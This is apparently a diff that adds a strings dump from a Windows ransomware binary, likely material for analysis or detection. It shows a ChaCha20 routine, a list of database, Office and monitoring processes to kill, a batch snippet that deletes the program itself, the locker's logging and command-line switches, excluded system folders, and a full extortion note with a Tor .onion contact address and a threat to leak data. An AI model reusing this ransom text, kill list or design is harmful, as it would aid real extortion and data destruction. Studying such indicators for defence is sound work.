@@ -1,0 +1,344 @@
+!This program cannot be run in DOS mode.
+.rdata
+@.data
+.pdata
+@.reloc
+expand 32-byte k
+ChaCha20 for x86_64, CRYPTOGAMS by <appro@openssl.org>
+SUATAUAVAWH
+oF D3f0D3n4D3v8D3~<H
+oD$@fD
+oL$PfD
+oT$`fD
+o\$pfD
+ol$0fE
+oD$ fD
+oL$0fE
+VWSUATAUAVAW
+A_A^A]A\][_^
+VWSUATAUAVAW
+WATAUAVAWH
+ A_A^A]A\_
+t9\$Tt
+t$ WAVAWH
+0A_A^_
+f9:t"L
+t$ WAVAWH
+@A_A^_
+t4f9|D
+WAVAWH
+ A_A^_
+@USWAVAWH
+A_A^_[]
+voH9sPtiH9k@tcf9k8t]@
+\$ UVWH
+9\$`v+H
+u'f95w
+%CLIENT_ID%
+0123456789abcdef
+SeRestorePrivilege
+msftesql.exe
+sqlagent.exe
+sqlbrowser.exe
+sqlwriter.exe
+oracle.exe
+ocssd.exe
+dbsnmp.exe
+synctime.exe
+agntsvc.exe
+isqlplussvc.exe
+xfssvccon.exe
+sqlservr.exe
+mydesktopservice.exe
+ocautoupds.exe
+encsvc.exe
+firefoxconfig.exe
+tbirdconfig.exe
+mydesktopqos.exe
+ocomm.exe
+mysqld.exe
+mysqld-nt.exe
+mysqld-opt.exe
+dbeng50.exe
+sqbcoreservice.exe
+excel.exe
+infopath.exe
+msaccess.exe
+mspub.exe
+onenote.exe
+outlook.exe
+powerpnt.exe
+thebat.exe
+steam.exe
+thebat64.exe
+thunderbird.exe
+visio.exe
+winword.exe
+wordpad.exe
+QBW32.exe
+QBW64.exe
+ipython.exe
+wpython.exe
+python.exe
+dumpcap.exe
+procmon.exe
+procmon64.exe
+procexp.exe
+procexp64.exe
+database
+msexchange
+attrib -s -r -h %1
+del /F /Q %1
+if exist %1 goto l
+del %0 
+SHELL32.dll
+wsprintfW
+USER32.dll
+RtlVirtualUnwind
+ZwQuerySystemInformation
+RtlGetNativeSystemInformation
+RtlGetVersion
+ntdll.dll
+GetVolumeInformationW
+FindFirstFileW
+HeapFree
+FindNextFileW
+lstrlenW
+FindClose
+GetLastError
+lstrcatW
+HeapAlloc
+GetProcessHeap
+lstrcpyW
+WriteFile
+CreateFileW
+CloseHandle
+HeapReAlloc
+GetCurrentProcessId
+WideCharToMultiByte
+GetTickCount
+QueryPerformanceFrequency
+QueryPerformanceCounter
+GetCurrentProcess
+CreateMutexW
+GetWindowsDirectoryW
+ReadFile
+GetFileSizeEx
+SetEndOfFile
+SetFileInformationByHandle
+SetFilePointerEx
+DeviceIoControl
+SetFileAttributesW
+CreateThread
+lstrcmpiW
+GetDriveTypeW
+GetCommandLineW
+GetModuleFileNameW
+ExitProcess
+SetErrorMode
+lstrlenA
+GetComputerNameA
+TerminateProcess
+OpenProcess
+lstrcmpiA
+GetTempPathW
+CreateProcessW
+GetSystemInfo
+GlobalMemoryStatus
+GetConsoleScreenBufferInfo
+EnterCriticalSection
+GetStdHandle
+LeaveCriticalSection
+InitializeCriticalSection
+GetTickCount64
+WriteConsoleW
+DeleteCriticalSection
+SetConsoleCursorPosition
+AllocConsole
+KERNEL32.dll
+_vsnwprintf
+_getch
+msvcrt.dll
+CryptReleaseContext
+CryptImportKey
+CryptEncrypt
+CryptAcquireContextW
+CryptDestroyKey
+OpenServiceA
+QueryServiceStatusEx
+ControlService
+OpenSCManagerA
+CloseServiceHandle
+EnumServicesStatusA
+OpenProcessToken
+LookupPrivilegeValueA
+AdjustTokenPrivileges
+GetUserNameW
+ADVAPI32.dll
+StrCmpIW
+StrStrIW
+StrToIntW
+SHRegSetUSValueW
+StrStrIA
+SHLWAPI.dll
+memcpy
+memset
+d2286a4888eb4f0d0033360ef84cfea2<html>
+<head>
+<title>RECOVERY MANUAL</title>
+</head>
+<body>
+<h1>Your ClientId:</h1>
+      
+%CLIENT_ID%                                                     
+</pre>
+<b>/!\ YOUR NETWORK HAS BEEN HACKED /!\<br>
+All your important files have been encrypted!</b><br>
+Your files are safe! Only encrypted.<br><br>
+ANY ATTEMPT TO RESTORE YOUR FILES WITH THIRD-PARTY SOFTWARE<br>
+WILL PERMANENTLY CORRUPT IT.<br>
+DO NOT MODIFY ENCRYPTED FILES.<br>
+DO NOT RENAME ENCRYPTED FILES.<br><br>
+No software available on internet can help you. We are the only ones able to<br>
+solve your problem.<br><br>
+You can send us 2-3 files and we will decrypt it for free<br>
+to prove we are able to give your files back.<br><br>
+Also we gathered highly confidential/personal data from your network. These data are currently stored on<br>
+a private server. This server will be immediately destroyed after your payment.<br>
+If you won't pay, we will release your data to public or reseller.<br>
+So you can expect your data to be published or improperly used in the near future.<br>
+In this case you will face all legal and reputational consequences of the leak.<br>
+We only desire to get a ransom and we don't aim to damage your reputation or destroy<br>
+your business.<br><br>
+        <hr/>
+<b>Contact us to discuss your next step.</b><br><br>
+<a href="http://elp7ouypgrqp7yfnnfzhsx2tyamymwmdu6s4xvgyputywwwok7vg4iid.onion/?cid=%CLIENT_ID%                                                     ">http://elp7ouypgrqp7yfnnfzhsx2tyamymwmdu6s4xvgyputywwwok7vg4iid.onion/?cid=%CLIENT_ID%                                                     </a><br>
+* Password field could be blank <br><br>
+* Note that this server is only available via Tor browser only<br><br>
+Follow the instructions to open the link:<br>
+              1. Type the addres "https://www.torproject.org" in your Internet browser. It opens the Tor site.<br>
+              2. Press "Download Tor", then press "Download Tor Browser Bundle", install and run it.<br>
+              3. Now you have Tor browser. In the Tor Browser open "http://elp7ouypgrqp7yfnnfzhsx2tyamymwmdu6s4xvgyputywwwok7vg4iid.onion/?cid=%CLIENT_ID%                                                     ". <br>
+              4. Start a chat and follow the further instructions. (Password field should be empty for the first login). <br><br>
+Please note, sometimes our support is away from keyboard, but we will reply shortly.<br>
+Kindly advise you to contact us as soon as possible.<br></b><br>
+</body>
+</html>
+[ERROR] locker.dir > enum gle=%u name=%s
+Microsoft Enhanced Cryptographic Provider v1.0
+%0.8X%0.8X%0.8X%0.8X
+[DENY] locker.check.dbl_run > exists
+[OK] locker.check.dbl_run > ok
+Ver %s x64
+[OK] locker > finished
+[ERROR] locker.file > set_pos gle=%u name=%s
+[ERROR] locker.file > read gle=%u name=%s
+[ERROR] locker.file > write gle=%u name=%s
+[ERROR] locker.file > open gle=%u name=%s
+[ERROR] locker.file > get_size gle=%u name=%s
+[ERROR] locker.file > rename gle=%u name=%s
+[ERROR] locker.file > write_key gle=%u name=%s
+[OK] locker.file > time=%0.3f size=%0.3f KB speed=%0.3f MB/s name=%s
+[OK] locker.file > time=%0.3f size=%0.3f MB speed=%0.3f MB/s name=%s
+:\Windows\
+:\System Volume Information\
+:\$RECYCLE.BIN\
+:\SYSTEM.SAV
+:\WINNT
+:\$WINDOWS.~BT\
+:\Windows.old\
+:\PerfLog\
+:\Boot
+\WindowsApps\
+\Microsoft\Windows\
+\Roaming\Microsoft\
+\Local\Microsoft\
+\LocalLow\Microsoft\
+:\ProgramData\Microsoft\
+\Local\Packages\
+:\ProgramData\Packages\
+\Windows Defender\
+\microsoft shared\
+\Google\Chrome\
+\Mozilla Firefox\
+\Mozilla\Firefox\
+\Internet Explorer\
+\MicrosoftEdge\
+\Tor Browser\
+\AppData\Local\Temp\
+Program Files
+Program Files (x86)
+ProgramData
+[SKIP] locker.dir.check > black_list name=%s
+[SKIP] locker.dir.check > no sql program dir name=%s
+[OK] locker.dir.check > name=%s
+[WARN] locker.dir.check > open gle=%u name=%s
+[WARN] locker.dir.check > get_reparse_point gle=%u name=%s
+[WARN] locker.dir.check > unknown_tag tag=%0.8X name=%s
+[SKIP] locker.dir.check > target_visibled target=%s name=%s
+[OK] locker.dir.check > target_hidden target=%s name=%s
+RecoveryManual.html
+bootmgr
+[ERROR] locker.dir.enum > malloc gle=%u name=%s
+[ERROR] locker.dir.enum > create_thread gle=%u name=%s
+[SKIP] locker.volume.enum > readonly name=%s
+[OK] locker.volume.enum > name=%s
+================================
+        Lock local drive        
+================================
+       Lock network drive       
+/path:
+[OK] locker.path.enum > name=%s
+            Lock path           
+/console
+/nolog
+/scan:
+/marker:
+/fullpd
+/nodel
+/nokill
+/fast:
+/onlypath
+explorer.exe RecoveryManual.html
+Software\Classes\.%0.8X\shell\Open\command
+[ERROR] locker.init > info=rsa gle=%u
+.ReadManual.%0.8X
+%S... 
+fail kill
+fail open
+========== KILL PROCESS ==========
+[ERROR] Fail get process list
+timeout
+========== KILL SERVICE ==========
+[ERROR] Fail get services list
+\%0.8X.bat
+"%s" "%s"
+========== SYS INFO ==========
+CORE COUNT:
+TOTAL MEM:
+WIN VER:
+%u.%u.%u SP%u
+WIN ARCH:
+USER NAME:
+IS ADMIN:
+CMDLINE:
+==[ STATS ]=======================
+Total crypted:
+%.3f GB
+Crypt Avg:
+%0.3f MB/s
+Files:
+%0.3f files/s
+%u sec
+==[ DIRS ]========================
+Total:
+Skipped:
+Error:
+==[ FILES ]=======================
+Locked:
+==[ FILES SKIPPED ]===============
+Black:
+Manual:
+==[ FILE ERROR ]==================
+Write:
+Rename:
